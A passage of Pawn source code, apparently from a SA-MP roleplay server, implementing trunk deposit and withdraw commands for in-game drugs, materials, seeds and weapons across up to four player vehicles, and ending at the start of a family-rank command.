				if(Player[playerid][pvvvMTMaterials] > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore medium materials.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much medium materials at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much medium materials at once.");
				if(Player[playerid][pMMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much medium materials on you.");
				Player[playerid][pvvvMTMaterials] += amount;
				Player[playerid][pMMaterials] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d of medium materials inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "highmats", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit highmats [amount]");
				if(Player[playerid][pvvvHTMaterials] > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore high materials.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much high materials at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much high materials at once.");
				if(Player[playerid][pHMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much high materials on you.");
				Player[playerid][pvvvHTMaterials] += amount;
				Player[playerid][pHMaterials] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d of high materials inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
 		    else if(!strcmp(option, "seeds", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit seeds [amount]");
				if(Player[playerid][pvVVTWSeeds] > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore seeds.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much seeds at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much seeds at once.");
				if(Player[playerid][pSeeds] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seeds on you.");
				Player[playerid][pvVVTWSeeds] += amount;
				Player[playerid][pSeeds] -= amount;
				format(string, sizeof(string), "* %s opens their vehicles trunk and puts %d seeds inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "weapon", true, 4))
			{
				if(!GetPlayerWeapon(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not holding a weapon in your hand.");
				new tw[2], w[2];
				for(new i=0; i<13; i++)
				{
		 			GetPlayerWeaponData(playerid, i, tw[0], tw[1]);
					if(tw[0] == GetPlayerWeapon(playerid))
					{
						w[0] = tw[0];
						w[1] = tw[1];
					}
				}
				if(!Player[playerid][pvVVTGun][0])
				{
					Player[playerid][pvVVTGun][0] = w[0];
					Player[playerid][pvVVTGunAmmo][0] = w[1];
					done = 1;
				}
				else if(!Player[playerid][pvVVTGun][1])
				{
					Player[playerid][pvVVTGun][1] = w[0];
					Player[playerid][pvVVTGunAmmo][1] = w[1];
					done = 1;
				}
				if(done)
				{
					format(string, sizeof(string), "* %s puts a %s inside their trunk.", GetName(playerid), RWN(GetPlayerWeapon(playerid)));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
					RemoveZamoraWeapon(playerid, w[0]);
				}
				else SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't contain any more weapons.");
			}
			done = 1;
	    }
	    if(!done) SendClientMessage(playerid, COLOR_GRAD2, "You are not near a vehicle you own.");
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You don't own any vehicle.");
	    return 1;
	}
    return 1;
}
//replace twithdraw with this
IRP:twithdraw(playerid, var[])
{
	new string[128] ,option[32], amount, done;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(topened[playerid] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "You need to open your trunk first.");
   	if(Player[playerid][pVeh] || Player[playerid][pVVeh] || Player[playerid][pVVVeh] || Player[playerid][pVVVVeh])
    {
        new Float:vx, Float:vy, Float:vz;
	    GetVehiclePos(Player[playerid][pVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        if(sscanf(var, "s[32]", option))
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw [item]");
        		SendClientMessage(playerid, COLOR_GRAD2, "Weapon | Weed | Cocaine | lowmats | mediummats | highmats ");
				return 1;
		    }
		    if(!strcmp(option, "weed", true, 4))
		    {
		  	 	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw weed [amount]");
		    	if(Player[playerid][pTWeed] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much weed in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pTWeed] -= amount;
		    	Player[playerid][pWeed] += amount;
		    	format(string, sizeof(string), "* %s opens their trunk and takes %d grams of weed from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "cocaine", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw cocaine [amount]");
		    	if(Player[playerid][pTCocaine] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much cocaine in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pTCocaine] -= amount;
		    	Player[playerid][pCocaine] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d grams of cocaine from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "lowmats", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw lowmats [amount]");
		    	if(Player[playerid][pLTMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much lowmats materials in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pLTMaterials] -= amount;
		    	Player[playerid][pLMaterials] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d low materials from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "mediummats", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw mediummats [amount]");
		    	if(Player[playerid][pMTMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much mediummats materials in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pMTMaterials] -= amount;
		    	Player[playerid][pMMaterials] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d medium materials from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "highmats", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw highmats [amount]");
		    	if(Player[playerid][pHTMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much highmats materials in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pHTMaterials] -= amount;
		    	Player[playerid][pHMaterials] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d high materials from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
 		    if(!strcmp(option, "weed", true, 4))
		    {
		  	 	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw seeds [amount]");
		    	if(Player[playerid][pTWSeeds] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seeds in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pTWSeeds] -= amount;
		    	Player[playerid][pSeeds] += amount;
		    	format(string, sizeof(string), "* %s opens their trunk and takes %d seeds from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
   		    if(!strcmp(option, "seeds", true, 4))
		    {
		  	 	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw seeds [amount]");
		    	if(Player[playerid][pTWSeeds] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seeds in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pTWSeeds] -= amount;
		    	Player[playerid][pSeeds] += amount;
		    	format(string, sizeof(string), "* %s opens their trunk and takes %d seeds from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "weapon", true, 4))
		    {
		     	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw weapon [slot]");
		        if(amount < 1 || amount > 2) return SendClientMessage(playerid, COLOR_GRAD2, "Weapon slots are between 1 and 2.");
		        amount = amount-1;
		        if(!Player[playerid][pTGun][amount]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a weapon in this slot.");
		        GiveZamoraWeapon(playerid, Player[playerid][pTGun][amount], Player[playerid][pTGunAmmo][amount]);
				format(string, sizeof(string), "* %s takes a %s from their trunk.", GetName(playerid), RWN(Player[playerid][pTGun][amount]));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		     	Player[playerid][pTGun][amount] = 0;
				Player[playerid][pTGunAmmo][amount] = 0;
		    }
		    done = 1;
	    }
	    // Second Vehicle
	    new Float:vvx, Float:vvy, Float:vvz;
	    GetVehiclePos(Player[playerid][pVVeh], vvx, vvy, vvz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vvx, vvy, vvz))
	    {
	        if(sscanf(var, "s[32]", option))
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw [item]");
        		SendClientMessage(playerid, COLOR_GRAD2, "Weapon | Weed | Cocaine | Material");
				return 1;
		    }
		    if(!strcmp(option, "weed", true, 4))
		    {
		  	 	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw weed [amount]");
		    	if(Player[playerid][pvTWeed] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much weed in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvTWeed] -= amount;
		    	Player[playerid][pWeed] += amount;
		    	format(string, sizeof(string), "* %s opens their trunk and takes %d grams of weed from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "cocaine", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw cocaine [amount]");
		    	if(Player[playerid][pvTCocaine] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much cocaine in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvTCocaine] -= amount;
		    	Player[playerid][pCocaine] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d grams of cocaine from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "lowmats", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw lowmats [amount]");
		    	if(Player[playerid][pvLTMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much lowmats materials in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvLTMaterials] -= amount;
		    	Player[playerid][pLMaterials] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d low materials from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "mediummats", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw mediummats [amount]");
		    	if(Player[playerid][pvMTMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much mediummats materials in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvMTMaterials] -= amount;
		    	Player[playerid][pMMaterials] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d medium materials from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "highmats", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw highmats [amount]");
		    	if(Player[playerid][pvHTMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much highmats materials in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvHTMaterials] -= amount;
		    	Player[playerid][pHMaterials] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d high materials from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
 		    if(!strcmp(option, "weed", true, 4))
		    {
		  	 	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw seeds [amount]");
		    	if(Player[playerid][pvTWSeeds] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seeds in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvTWSeeds] -= amount;
		    	Player[playerid][pSeeds] += amount;
		    	format(string, sizeof(string), "* %s opens their trunk and takes %d seeds from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
   		    if(!strcmp(option, "seeds", true, 4))
		    {
		  	 	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw seeds [amount]");
		    	if(Player[playerid][pvTWSeeds] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seeds in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvTWSeeds] -= amount;
		    	Player[playerid][pSeeds] += amount;
		    	format(string, sizeof(string), "* %s opens their trunk and takes %d seeds from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "weapon", true, 4))
		    {
		     	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw weapon [slot]");
		        if(amount < 1 || amount > 2) return SendClientMessage(playerid, COLOR_GRAD2, "Weapon slots are between 1 and 2.");
		        amount = amount-1;
		        if(!Player[playerid][pvTGun][amount]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a weapon in this slot.");
		        GiveZamoraWeapon(playerid, Player[playerid][pvTGun][amount], Player[playerid][pvTGunAmmo][amount]);
				format(string, sizeof(string), "* %s takes a %s from their trunk.", GetName(playerid), RWN(Player[playerid][pvTGun][amount]));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		     	Player[playerid][pvTGun][amount] = 0;
				Player[playerid][pvTGunAmmo][amount] = 0;
		    }
		    done = 1;
	    }
	    // Third Vehicle
	    new Float:vvvx, Float:vvvy, Float:vvvz;
	    GetVehiclePos(Player[playerid][pVVVeh], vvvx, vvvy, vvvz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vvvx, vvvy, vvvz))
	    {
	        if(sscanf(var, "s[32]", option))
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw [item]");
        		SendClientMessage(playerid, COLOR_GRAD2, "Weapon | Weed | Cocaine | Material");
				return 1;
		    }
		    if(!strcmp(option, "weed", true, 4))
		    {
		  	 	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw weed [amount]");
		    	if(Player[playerid][pvVTWeed] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much weed in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvVTWeed] -= amount;
		    	Player[playerid][pWeed] += amount;
		    	format(string, sizeof(string), "* %s opens their trunk and takes %d grams of weed from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "cocaine", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw cocaine [amount]");
		    	if(Player[playerid][pvVTCocaine] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much cocaine in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvVTCocaine] -= amount;
		    	Player[playerid][pCocaine] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d grams of cocaine from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "lowmats", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw lowmats [amount]");
		    	if(Player[playerid][pvvLTMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much lowmats materials in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvvLTMaterials] -= amount;
		    	Player[playerid][pLMaterials] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d low materials from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "mediummats", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw mediummats [amount]");
		    	if(Player[playerid][pvvMTMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much mediummats materials in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvvMTMaterials] -= amount;
		    	Player[playerid][pMMaterials] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d medium materials from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "highmats", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw highmats [amount]");
		    	if(Player[playerid][pvvHTMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much highmats materials in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvvHTMaterials] -= amount;
		    	Player[playerid][pHMaterials] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d high materials from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
  		    if(!strcmp(option, "seeds", true, 4))
		    {
		  	 	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw seeds [amount]");
		    	if(Player[playerid][pvVTWSeeds] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seeds in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvVTWSeeds] -= amount;
		    	Player[playerid][pSeeds] += amount;
		    	format(string, sizeof(string), "* %s opens their trunk and takes %d seeds from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "weapon", true, 4))
		    {
		     	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw weapon [slot]");
		        if(amount < 1 || amount > 2) return SendClientMessage(playerid, COLOR_GRAD2, "Weapon slots are between 1 and 2.");
		        amount = amount-1;
		        if(!Player[playerid][pvVTGun][amount]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a weapon in this slot.");
		        GiveZamoraWeapon(playerid, Player[playerid][pvVTGun][amount], Player[playerid][pvVTGunAmmo][amount]);
				format(string, sizeof(string), "* %s takes a %s from their trunk.", GetName(playerid), RWN(Player[playerid][pvVTGun][amount]));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		     	Player[playerid][pvVTGun][amount] = 0;
				Player[playerid][pvVTGunAmmo][amount] = 0;
		    }
		    done = 1;
	    }
	    // Fourth Vehicle
	    new Float:vvvvx, Float:vvvvy, Float:vvvvz;
	    GetVehiclePos(Player[playerid][pVVVVeh], vvvvx, vvvvy, vvvvz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vvvvx, vvvvy, vvvvz))
	    {
	        if(sscanf(var, "s[32]", option))
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw [item]");
        		SendClientMessage(playerid, COLOR_GRAD2, "Weapon | Weed | Cocaine | Material");
				return 1;
		    }
		    if(!strcmp(option, "weed", true, 4))
		    {
		  	 	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw weed [amount]");
		    	if(Player[playerid][pvVVTWeed] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much weed in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvVVTWeed] -= amount;
		    	Player[playerid][pWeed] += amount;
		    	format(string, sizeof(string), "* %s opens their trunk and takes %d grams of weed from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "cocaine", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw cocaine [amount]");
		    	if(Player[playerid][pvVVTCocaine] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much cocaine in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvVVTCocaine] -= amount;
		    	Player[playerid][pCocaine] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d grams of cocaine from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "lowmats", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw lowmats [amount]");
		    	if(Player[playerid][pvvvLTMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much lowmats materials in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvvvLTMaterials] -= amount;
		    	Player[playerid][pLMaterials] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d low materials from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "mediummats", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw mediummats [amount]");
		    	if(Player[playerid][pvvvMTMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much mediummats materials in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvvvMTMaterials] -= amount;
		    	Player[playerid][pMMaterials] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d medium materials from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "highmats", true, 4))
		    {
		    	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw highmats [amount]");
		    	if(Player[playerid][pvvvHTMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much highmats materials in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvvvHTMaterials] -= amount;
		    	Player[playerid][pHMaterials] += amount;
		   	 	format(string, sizeof(string), "* %s opens their trunk and takes %d high materials from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
  		    if(!strcmp(option, "seeds", true, 4))
		    {
		  	 	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw seeds [amount]");
		    	if(Player[playerid][pvVVTWSeeds] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seeds in your trunk.");
		    	if(amount <= 0) return 0;
		    	Player[playerid][pvVVTWSeeds] -= amount;
		    	Player[playerid][pSeeds] += amount;
		    	format(string, sizeof(string), "* %s opens their trunk and takes %d seeds from it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		    }
		    else if(!strcmp(option, "weapon", true, 4))
		    {
		     	if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /twithdraw weapon [slot]");
		        if(amount < 1 || amount > 2) return SendClientMessage(playerid, COLOR_GRAD2, "Weapon slots are between 1 and 2.");
		        amount = amount-1;
		        if(!Player[playerid][pvVVTGun][amount]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a weapon in this slot.");
		        GiveZamoraWeapon(playerid, Player[playerid][pvVVTGun][amount], Player[playerid][pvVVTGunAmmo][amount]);
				format(string, sizeof(string), "* %s takes a %s from their trunk.", GetName(playerid), RWN(Player[playerid][pvVVTGun][amount]));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		     	Player[playerid][pvVVTGun][amount] = 0;
				Player[playerid][pvVVTGunAmmo][amount] = 0;
		    }
		    done = 1;
	    }
	    if(!done) SendClientMessage(playerid, COLOR_GRAD2, "You are not near a vehicle you own.");
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You don't own any vehicle.");
	    return 1;
	}
    return 1;
}
IRP:frank(playerid, var[])
{
	new user, rank, string[128], idx = Player[playerid][pFam];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pFamRank] < 5) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a family leader.");
	if(sscanf(var, "ui", user, rank)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /frank [playerid] [rank]");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't change your rank.");
